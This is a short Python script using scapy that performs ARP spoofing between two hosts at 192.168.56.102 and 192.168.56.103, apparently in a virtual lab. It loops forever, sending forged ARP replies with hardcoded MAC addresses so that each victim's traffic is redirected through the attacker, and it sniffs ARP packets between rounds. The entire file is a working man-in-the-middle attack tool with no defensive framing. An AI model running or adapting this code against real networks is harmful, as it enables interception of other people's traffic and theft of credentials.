from scapy.all import *





def main():
	while 1:
		ip1="192.168.56.102"
		ip2="192.168.56.103"		
		arpSpoof(ip1,ip2,"08:00:27:DF:17:8C","08:00:27:1A:C1:21")
		arpSpoof(ip2,ip1,"08:00:27:DF:17:8C","08:00:27:36:72:04")
		sniff(filter="arp and host 192.168.56.102 or host 192.168.56.103", count=1)
	

def arpSpoof(src_ip,dest_ip,src_mac,dest_mac):
	arpPac=ARP(op=2,hwsrc=src_mac,hwdst=dest_mac,psrc=src_ip,pdst=dest_ip)
	send(arpPac,iface="eth13")


main()